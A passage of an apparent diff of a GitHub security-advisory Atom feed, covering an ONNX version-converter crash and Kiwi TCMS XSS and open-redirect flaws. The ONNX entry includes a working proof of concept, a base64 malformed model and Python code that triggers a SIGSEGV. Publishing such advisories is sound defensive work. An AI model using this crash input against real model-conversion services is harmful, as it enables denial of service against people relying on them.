-<li><a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">https://en.wikipedia.org/wiki/Cross-site_request_forgery</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox#caveats">https://github.com/ArchiveBox/ArchiveBox#caveats</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Security-Overview">https://github.com/ArchiveBox/ArchiveBox/wiki/Security-Overview</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#security-concerns">https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#security-concerns</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/security/advisories/GHSA-cr45-98w9-gwqx">https://github.com/ArchiveBox/ArchiveBox/security/advisories/GHSA-cr45-98w9-gwqx</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/issues/239">https://github.com/ArchiveBox/ArchiveBox/issues/239</a></li>
-<li><a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">https://en.wikipedia.org/wiki/Cross-site_request_forgery</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox#caveats">https://github.com/ArchiveBox/ArchiveBox#caveats</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Configuration#save_wget">https://github.com/ArchiveBox/ArchiveBox/wiki/Configuration#save_wget</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#2-export-and-host-it-as-static-html">https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#2-export-and-host-it-as-static-html</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#security-concerns">https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#security-concerns</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Security-Overview">https://github.com/ArchiveBox/ArchiveBox/wiki/Security-Overview</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-45815">https://nvd.nist.gov/vuln/detail/CVE-2023-45815</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/archivebox/PYSEC-2023-229.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/archivebox/PYSEC-2023-229.yaml</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/pull/1773">https://github.com/ArchiveBox/ArchiveBox/pull/1773</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/commit/a6548df8d0aae1d3d326deb1191b128232708166">https://github.com/ArchiveBox/ArchiveBox/commit/a6548df8d0aae1d3d326deb1191b128232708166</a></li>
-<li><a href="https://github.com/advisories/GHSA-cr45-98w9-gwqx">https://github.com/advisories/GHSA-cr45-98w9-gwqx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cr45-98w9-gwqx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2023-10-19T16:13:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[onnx] ONNX has Null Pointer Dereference in Upsample Version Converter Adapter (Zero Inputs)]]></title>
-        <id>https://github.com/advisories/GHSA-hwpq-hmq9-wj77</id>
-        <link href="https://github.com/advisories/GHSA-hwpq-hmq9-wj77"/>
-        <updated>2026-07-07T13:02:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Null pointer dereference (SIGSEGV) in <code>Upsample_6_7::adapt_upsample_6_7()</code> (<code>onnx/version_converter/adapters/upsample_6_7.h:31</code>) when <code>convert_version()</code> processes a model with an Upsample node that has zero inputs. The adapter accesses <code>node-&gt;inputs()[0]-&gt;sizes()</code> without checking input count. 107-byte PoC crashes on Release build.</p>
-<p>This is the same class of bug as the Cast adapter advisory (separate report) but in a different adapter, different file, and different operator.</p>
-<h3 id="details">Details</h3>
-<p>The Upsample 6→7 adapter validates attributes but not inputs:</p>
-<pre><code class="language-cpp">// upsample_6_7.h:20-33
-void adapt_upsample_6_7(..., Node* node) const {
-    ONNX_ASSERTM(
-        node-&gt;hasAttribute(width_scale_symbol) &amp;&amp; node-&gt;hasAttribute(height_scale_symbol),
-        "...")  // Attribute check PASSES
-
-    auto width_scale = node-&gt;f(width_scale_symbol);
-    auto height_scale = node-&gt;f(height_scale_symbol);
-
-    auto input_shape = node-&gt;inputs()[0]-&gt;sizes();
-    //                 ^^^^^^^^^^^^^^^^^^^^
-    //                 OOB when inputs().size() == 0 → SIGSEGV
-}
-</code></pre>
-<p>The PoC has an Upsample node at opset 6 with the required <code>width_scale</code> and <code>height_scale</code> attributes but zero inputs. The attribute assertions pass, then <code>node-&gt;inputs()[0]</code> on an empty <code>ArrayRef</code>:</p>
-<ul>
-<li>Release builds (<code>NDEBUG</code>): bounds-check assertion compiled out → reads garbage pointer → SIGSEGV</li>
-<li>Debug builds: <code>assert(Index &lt; Length)</code> at <code>array_ref.h:159</code> → SIGABRT</li>
-</ul>
-<p>An Upsample node with zero inputs passes <code>graphProtoToGraph()</code> because the import code only resolves input names present in the protobuf.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-python">import base64
-import onnx
-from onnx import version_converter
-
-poc_b64 = "CAI6YQo8EgFZIghVcHNhbXBsZSoVCgt3aWR0aF9zY2FsZRUAAABAoAEBKhYKDGhlaWdodF9zY2FsZRUAAABAoAEBEgR0ZXN0YhsKAVkSFgoUCAESEAoCCAEKAggBCgIIBAoCCARCBAoAEAY="
-
-model = onnx.load_from_string(base64.b64decode(poc_b64))
-
-# CRASHES — Upsample_6_7 adapter dereferences empty inputs array
-version_converter.convert_version(model, 7)  # SIGSEGV
-</code></pre>
-<p>107-byte PoC. Confirmed SIGSEGV on both onnx 1.21.0 (pip) and 1.22.0 (source build).</p>
-<h3 id="impact">Impact</h3>
-<p>Any application that uses <code>onnx.version_converter.convert_version()</code> on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-upgrade opset versions for compatibility. The crash is unrecoverable (SIGSEGV). </p>
-<p>This vulnerability is part of a systemic pattern across multiple version converter adapters. A full audit of all ~45 adapters was performed as part of the fix; eight adapters were found with the same class of unguarded indexed access (cast_9_8, softmax_12_13, softmax_13_12, upsample_6_7, upsample_9_10, group_normalization_20_21, broadcast_forward_compatibility, upsample_9_8) and all have been fixed in PR #7813.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/onnx/onnx/security/advisories/GHSA-hwpq-hmq9-wj77">https://github.com/onnx/onnx/security/advisories/GHSA-hwpq-hmq9-wj77</a></li>
-<li><a href="https://github.com/onnx/onnx/pull/7916">https://github.com/onnx/onnx/pull/7916</a></li>
-<li><a href="https://github.com/onnx/onnx/releases/tag/v1.22.0">https://github.com/onnx/onnx/releases/tag/v1.22.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-hwpq-hmq9-wj77">https://github.com/advisories/GHSA-hwpq-hmq9-wj77</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hwpq-hmq9-wj77</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-07T13:02:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[kiwitcms] Kiwi TCMS vulnerable to stored XSS via JavaScript: URI in extra_link field (TestPlan & TestCase)]]></title>
-        <id>https://github.com/advisories/GHSA-473p-56xx-vg67</id>
-        <link href="https://github.com/advisories/GHSA-473p-56xx-vg67"/>
-        <updated>2026-07-06T21:49:43.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>In Kiwi TCMS the fields <code>TestCase.extra_link</code> and <code>TestPlan.extra_link</code> were meant to represent URLs to external resources however in versions prior to 16.1 user input was not being sanitized and values were rendered verbatim which represents an opportunity for cross-site scripting exploitation. In version 16.1 these fields are properly sanitized and existing database records which don't validate will be reset to a null value.</p>
-<h2 id="impact">Impact</h2>
-<p>Deployments which use the official Docker images and/or unmodified Kiwi TCMS middleware send a <code>Content-Security-Policy</code> header which makes this vulnerability difficult to exploit in practice because this header blocks the browser from executing inline JavaScript. Customized deployments which modify the default security settings may still be vulnerable.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-473p-56xx-vg67">https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-473p-56xx-vg67</a></li>
-<li><a href="https://github.com/kiwitcms/Kiwi/releases/tag/v16.1">https://github.com/kiwitcms/Kiwi/releases/tag/v16.1</a></li>
-<li><a href="https://kiwitcms.org/blog/kiwi-tcms-team/2026/06/24/kiwi-tcms-161">https://kiwitcms.org/blog/kiwi-tcms-team/2026/06/24/kiwi-tcms-161</a></li>
-<li><a href="https://github.com/advisories/GHSA-473p-56xx-vg67">https://github.com/advisories/GHSA-473p-56xx-vg67</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-473p-56xx-vg67</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-07-06T21:49:41.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[kiwitcms] Kiwi TCMS has an Open Redirect via unvalidated next parameter in account confirmation endpoint]]></title>
-        <id>https://github.com/advisories/GHSA-hmj5-jm8h-h9fh</id>
-        <link href="https://github.com/advisories/GHSA-hmj5-jm8h-h9fh"/>
-        <updated>2026-07-06T21:49:20.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An open redirect vulnerability in the account confirmation endpoint allows an unauthenticated attacker to craft a URL hosted on a legitimate Kiwi TCMS instance that redirects victims to an arbitrary external domain. The attack surface is particularly relevant for phishing campaigns targeting Kiwi TCMS users, as the malicious link originates from a trusted organizational hostname.</p>
-<h3 id="impact">Impact</h3>
-<p>This is an open redirect vulnerability (CWE-601). Any unauthenticated attacker can exploit it against any user of a Kiwi TCMS deployment.</p>
-<p>The primary risk is phishing. Because Kiwi TCMS is typically deployed as an internal tool for engineering and QA teams, a redirect from the organization's own hostname carries high implicit trust. An attacker can use this endpoint to:</p>
-<ul>
-<li>Redirect victims to a credential-harvesting page styled to match the Kiwi TCMS or corporate SSO login.</li>
-<li>Bypass email security filters and link-reputation checks that allowlist the organization's domain.</li>
-<li>Distribute malware via a convincing "confirm your account" lure.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-hmj5-jm8h-h9fh">https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-hmj5-jm8h-h9fh</a></li>
-<li><a href="https://github.com/kiwitcms/Kiwi/releases/tag/v16.1">https://github.com/kiwitcms/Kiwi/releases/tag/v16.1</a></li>
-<li><a href="https://kiwitcms.org/blog/kiwi-tcms-team/2026/06/24/kiwi-tcms-161">https://kiwitcms.org/blog/kiwi-tcms-team/2026/06/24/kiwi-tcms-161</a></li>
-<li><a href="https://github.com/advisories/GHSA-hmj5-jm8h-h9fh">https://github.com/advisories/GHSA-hmj5-jm8h-h9fh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hmj5-jm8h-h9fh</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-06T21:27:27.000Z</published>
     </entry>
 </feed>
